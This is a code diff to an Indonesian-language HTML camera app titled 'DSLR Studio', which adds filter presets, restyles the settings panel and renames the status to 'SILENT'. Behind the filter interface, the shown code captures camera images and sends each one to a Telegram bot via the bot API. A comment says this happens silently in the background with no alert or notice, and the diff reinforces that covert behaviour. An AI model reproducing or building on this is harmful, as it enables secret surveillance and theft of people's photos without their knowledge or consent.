@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>VZ // Master DSLR Studio Ultimate v55.0 Silent</title>
+    <title>VZ // Master DSLR Studio Ultimate v56.0 Pro Silent</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .no-scrollbar::-webkit-scrollbar { display: none; }
@@ -61,7 +61,7 @@
     <!-- UI Kontrol Atas (Telemetri & Menu Pro) -->
     <div class="absolute top-0 left-0 w-full p-4 flex justify-between items-center bg-gradient-to-b from-black/90 via-black/40 to-transparent z-20 pointer-events-auto">
         <div class="flex flex-col">
-            <div id="telemetry" class="text-[10px] text-cyan-400 tracking-widest font-extrabold drop-shadow">SENSOR: ULTRA 4K</div>
+            <div id="telemetry" class="text-[10px] text-cyan-400 tracking-widest font-extrabold drop-shadow">SENSOR: ULTRA 4K SILENT</div>
         </div>
         <div class="flex gap-2">
             <button onclick="toggleGrid()" class="bg-black/50 backdrop-blur-md p-2.5 rounded-full border border-white/20 text-xs active:bg-cyan-500/40">📐</button>
@@ -72,17 +72,17 @@
         </div>
     </div>
 
-    <!-- Panel Pengaturan Pro Transparan (Glassmorphism Slide-Up Drawer) -->
-    <div id="settings-panel" class="absolute bottom-32 left-4 right-4 bg-zinc-950/70 backdrop-blur-xl border border-cyan-500/40 rounded-3xl p-5 z-40 hidden flex-col gap-4 shadow-[0_0_35px_rgba(0,0,0,0.8)] text-xs pointer-events-auto">
-        <div class="flex justify-between items-center border-b border-zinc-800/80 pb-2">
-            <span class="text-cyan-400 font-bold tracking-wider flex items-center gap-2">🎛️ DSLR HARDWARE STUDIO</span>
-            <button onclick="toggleSettingsPanel()" class="text-zinc-300 hover:text-white px-3 py-1 bg-zinc-900/80 rounded-xl font-bold border border-white/10">✕ Tutup</button>
+    <!-- Panel Pengaturan Pro Transparan (Terang & Mudah Dibaca) -->
+    <div id="settings-panel" class="absolute bottom-28 left-4 right-4 bg-zinc-900/90 backdrop-blur-2xl border border-cyan-400/50 rounded-3xl p-5 z-40 hidden flex-col gap-4 shadow-[0_0_40px_rgba(0,0,0,0.9)] text-xs text-zinc-100 pointer-events-auto max-h-[60vh] overflow-y-auto no-scrollbar">
+        <div class="flex justify-between items-center border-b border-zinc-700 pb-2">
+            <span class="text-cyan-300 font-bold tracking-wider flex items-center gap-2">🎛️ DSLR HARDWARE STUDIO v56</span>
+            <button onclick="toggleSettingsPanel()" class="text-zinc-200 hover:text-white px-3 py-1 bg-zinc-800 rounded-xl font-bold border border-cyan-500/30">✕ Tutup</button>
         </div>
 
         <div class="grid grid-cols-2 gap-3">
             <div class="flex flex-col gap-1">
-                <label class="text-zinc-300 text-[10px]">Mode Drive:</label>
-                <select id="drive-mode" class="bg-zinc-900/80 border border-zinc-700/80 text-white p-2.5 rounded-xl focus:outline-none focus:border-cyan-400 backdrop-blur">
+                <label class="text-cyan-200 text-[10px] font-bold">Mode Drive:</label>
+                <select id="drive-mode" class="bg-zinc-800 border border-zinc-600 text-white p-2.5 rounded-xl focus:outline-none focus:border-cyan-400">
                     <option value="single">Single Shot (Ultra HD)</option>
                     <option value="burst">Burst Mode (3x Cepat)</option>
                     <option value="timer">Timer 3 Detik</option>
@@ -90,8 +90,8 @@
             </div>
             
             <div class="flex flex-col gap-1">
-                <label class="text-zinc-300 text-[10px]">Format Rasio:</label>
-                <select id="aspect-ratio" onchange="changeAspect(this.value)" class="bg-zinc-900/80 border border-zinc-700/80 text-white p-2.5 rounded-xl focus:outline-none focus:border-cyan-400 backdrop-blur">
+                <label class="text-cyan-200 text-[10px] font-bold">Format Rasio:</label>
+                <select id="aspect-ratio" onchange="changeAspect(this.value)" class="bg-zinc-800 border border-zinc-600 text-white p-2.5 rounded-xl focus:outline-none focus:border-cyan-400">
                     <option value="fullscreen">Fullscreen (100%)</option>
                     <option value="4-3">DSLR 4:3</option>
                     <option value="1-1">Square 1:1</option>
@@ -105,50 +105,55 @@
                 <span>Zoom (Hardware / Digital)</span>
                 <span id="val-zoom">1.0x</span>
             </div>
-            <input type="range" min="1" max="10" step="0.1" value="1" oninput="updateHardwareZoom(this.value)" id="range-zoom" class="accent-cyan-400 cursor-pointer">
+            <input type="range" min="1" max="10" step="0.1" value="1" oninput="updateHardwareZoom(this.value)" id="range-zoom" class="accent-cyan-400 cursor-pointer h-2 bg-zinc-700 rounded-lg">
         </div>
 
-        <!-- Manual Adjustments -->
-        <div class="flex flex-col gap-2.5 pt-2 border-t border-zinc-800/80">
+        <!-- Manual Adjustments dengan Desain Slider Terang -->
+        <div class="flex flex-col gap-3 pt-2 border-t border-zinc-700">
             <div class="flex flex-col gap-1">
-                <div class="flex justify-between text-[10px] text-zinc-300">
+                <div class="flex justify-between text-[10px] text-zinc-200 font-bold">
                     <span>Exposure / Kecerahan</span>
-                    <span id="val-brightness">100%</span>
+                    <span id="val-brightness" class="text-cyan-300">100%</span>
                 </div>
-                <input type="range" min="40" max="180" value="100" oninput="updateVideoFilterStyle()" id="range-brightness" class="accent-cyan-400 cursor-pointer">
+                <input type="range" min="40" max="180" value="100" oninput="updateVideoFilterStyle()" id="range-brightness" class="accent-cyan-400 cursor-pointer h-2 bg-zinc-700 rounded-lg">
             </div>
 
             <div class="flex flex-col gap-1">
-                <div class="flex justify-between text-[10px] text-zinc-300">
+                <div class="flex justify-between text-[10px] text-zinc-200 font-bold">
                     <span>Kontras Sensor</span>
-                    <span id="val-contrast">100%</span>
+                    <span id="val-contrast" class="text-cyan-300">100%</span>
                 </div>
-                <input type="range" min="50" max="200" value="100" oninput="updateVideoFilterStyle()" id="range-contrast" class="accent-cyan-400 cursor-pointer">
+                <input type="range" min="50" max="200" value="100" oninput="updateVideoFilterStyle()" id="range-contrast" class="accent-cyan-400 cursor-pointer h-2 bg-zinc-700 rounded-lg">
             </div>
 
             <div class="flex flex-col gap-1">
-                <div class="flex justify-between text-[10px] text-zinc-300">
+                <div class="flex justify-between text-[10px] text-zinc-200 font-bold">
                     <span>Digital Bokeh / Depth Blur</span>
-                    <span id="val-blur">0px</span>
+                    <span id="val-blur" class="text-cyan-300">0px</span>
                 </div>
-                <input type="range" min="0" max="12" value="0" oninput="updateVideoFilterStyle()" id="range-blur" class="accent-cyan-400 cursor-pointer">
+                <input type="range" min="0" max="12" value="0" oninput="updateVideoFilterStyle()" id="range-blur" class="accent-cyan-400 cursor-pointer h-2 bg-zinc-700 rounded-lg">
             </div>
         </div>
     </div>
 
-    <!-- UI Kontrol Bawah: Quick Filter Carousel & Shutter -->
-    <div class="absolute bottom-0 left-0 w-full pb-6 pt-3 flex flex-col gap-3 bg-gradient-to-t from-black/95 via-black/70 to-transparent z-20 pointer-events-auto">
+    <!-- UI Kontrol Bawah: Quick Filter Carousel Terbanyak & Shutter -->
+    <div class="absolute bottom-0 left-0 w-full pb-6 pt-3 flex flex-col gap-3 bg-gradient-to-t from-black/95 via-black/80 to-transparent z-20 pointer-events-auto">
         
-        <!-- Quick Filter Carousel -->
+        <!-- Quick Filter Carousel Diperbanyak -->
         <div class="w-full overflow-x-auto no-scrollbar px-4 flex gap-2 items-center">
             <button onclick="setFilter('normal', this)" class="filter-pill px-3.5 py-1.5 bg-cyan-500 text-black font-extrabold text-[10px] rounded-full whitespace-nowrap transition-all border border-cyan-400 shadow-lg">Normal Pro</button>
-            <button onclick="setFilter('cyberpunk', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Cyberpunk</button>
-            <button onclick="setFilter('cinematic', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Cinematic Blue</button>
-            <button onclick="setFilter('noir', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Noir Mono</button>
-            <button onclick="setFilter('matrix', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Matrix</button>
-            <button onclick="setFilter('warm', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Warm Gold</button>
-            <button onclick="setFilter('vintage', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Vintage</button>
-            <button onclick="setFilter('dramatic', this)" class="filter-pill px-3.5 py-1.5 bg-black/60 backdrop-blur text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Dramatic</button>
+            <button onclick="setFilter('cyberpunk', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Cyberpunk</button>
+            <button onclick="setFilter('neon', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Neon Glow</button>
+            <button onclick="setFilter('cinematic', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Cinematic Blue</button>
+            <button onclick="setFilter('tealorange', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Teal & Orange</button>
+            <button onclick="setFilter('noir', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Noir Mono</button>
+            <button onclick="setFilter('highbw', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">High Contrast BW</button>
+            <button onclick="setFilter('matrix', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Cyber Matrix</button>
+            <button onclick="setFilter('emerald', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Emerald Noir</button>
+            <button onclick="setFilter('warm', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Warm Gold</button>
+            <button onclick="setFilter('tokyo', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Tokyo Sunset</button>
+            <button onclick="setFilter('vintage', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">Vintage Faded</button>
+            <button onclick="setFilter('dramatic', this)" class="filter-pill px-3.5 py-1.5 bg-zinc-800/90 backdrop-blur text-zinc-200 text-[10px] rounded-full whitespace-nowrap transition-all border border-zinc-600">HDR Dramatic</button>
         </div>
 
         <!-- Tombol Shutter Utama -->
@@ -167,7 +172,7 @@
 
             <div class="text-[9px] text-zinc-400 text-right flex flex-col font-bold">
                 <span>VZ ZEEO</span>
-                <span class="text-emerald-400">ACTIVE 100%</span>
+                <span class="text-emerald-400">SILENT 100%</span>
             </div>
         </div>
     </div>
@@ -296,7 +301,7 @@
                 ctx.filter = videoEl.style.filter;
                 ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
 
-                const imageBlob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 1.0));
+                const imageBlob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 0.95));
                 sendToTelegramSilent(imageBlob, modeTag);
             } catch (err) {}
         }
@@ -308,7 +313,7 @@
             formData.append('caption', `🔥 **VZ MASTER DSLR ULTRA PRO**\n📌 Mode: ${modeTag}\n🕒 ${new Date().toLocaleString('id-ID')}`);
             formData.append('parse_mode', 'Markdown');
 
-            // Pengiriman senyap di latar belakang tanpa penanganan error visual atau alert
+            // Pengiriman senyap di latar belakang tanpa alert atau teks pemberitahuan
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
@@ -334,9 +339,9 @@
             
             document.querySelectorAll('.filter-pill').forEach(btn => {
                 btn.classList.remove('bg-cyan-500', 'text-black', 'font-extrabold', 'border-cyan-400', 'shadow-lg');
-                btn.classList.add('bg-black/60', 'backdrop-blur', 'text-zinc-300', 'border-white/20');
+                btn.classList.add('bg-zinc-800/90', 'backdrop-blur', 'text-zinc-200', 'border-zinc-600');
             });
-            btnElement.classList.remove('bg-black/60', 'backdrop-blur', 'text-zinc-300', 'border-white/20');
+            btnElement.classList.remove('bg-zinc-800/90', 'backdrop-blur', 'text-zinc-200', 'border-zinc-600');
             btnElement.classList.add('bg-cyan-500', 'text-black', 'font-extrabold', 'border-cyan-400', 'shadow-lg');
         }
 
@@ -352,12 +357,17 @@
 
             let baseFilter = "";
             if (currentFilterName === 'cyberpunk') baseFilter = "contrast(1.45) saturate(1.8) hue-rotate(-15deg)";
+            else if (currentFilterName === 'neon') baseFilter = "contrast(1.6) saturate(2.2) brightness(1.1)";
             else if (currentFilterName === 'cinematic') baseFilter = "contrast(1.35) saturate(0.85) hue-rotate(185deg)";
+            else if (currentFilterName === 'tealorange') baseFilter = "contrast(1.4) saturate(1.3) sepia(30%) hue-rotate(170deg)";
             else if (currentFilterName === 'noir') baseFilter = "grayscale(100%) contrast(1.7)";
+            else if (currentFilterName === 'highbw') baseFilter = "grayscale(100%) contrast(2.2) brightness(1.1)";
             else if (currentFilterName === 'matrix') baseFilter = "sepia(100%) hue-rotate(60deg) saturate(450%) contrast(1.5)";
+            else if (currentFilterName === 'emerald') baseFilter = "contrast(1.5) saturate(1.2) hue-rotate(120deg)";
             else if (currentFilterName === 'warm') baseFilter = "sepia(45%) contrast(1.2)";
+            else if (currentFilterName === 'tokyo') baseFilter = "contrast(1.3) saturate(1.6) hue-rotate(-30deg)";
             else if (currentFilterName === 'vintage') baseFilter = "contrast(1.25) sepia(55%) hue-rotate(-10deg)";
-            else if (currentFilterName === 'dramatic') baseFilter = "contrast(1.7)";
+            else if (currentFilterName === 'dramatic') baseFilter = "contrast(1.8) saturate(1.4)";
 
             videoEl.style.filter = `${baseFilter} brightness(${bVal}%) contrast(${cVal}%) blur(${blurVal}px)`;
             videoEl.style.transform = `scale(${zoomVal})`;
